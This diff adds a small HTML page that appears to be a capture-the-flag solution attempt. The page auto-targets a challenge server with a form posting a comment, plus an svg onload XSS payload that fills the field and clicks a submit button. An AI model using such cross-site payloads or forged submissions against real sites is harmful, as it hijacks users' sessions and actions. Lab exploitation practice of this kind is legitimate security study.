@@ -1,0 +1,12 @@
+<html lang="en">
+<body>
+  <form id="comment-form" method="POST" action="http://202.38.93.111:10051/result">
+    <input type="text" id="comment" name="comment" value="Hello" />
+  </form>
+  <script>
+    const payload = `<svg onload="document.querySelector('[name=comment]').value='Hello';document.querySelector('button.btn').click()"></svg>`;
+    // window.open('http://202.38.93.111:10051/result');
+    window.open('test.html');
+  </script>
+</body>
+</html>
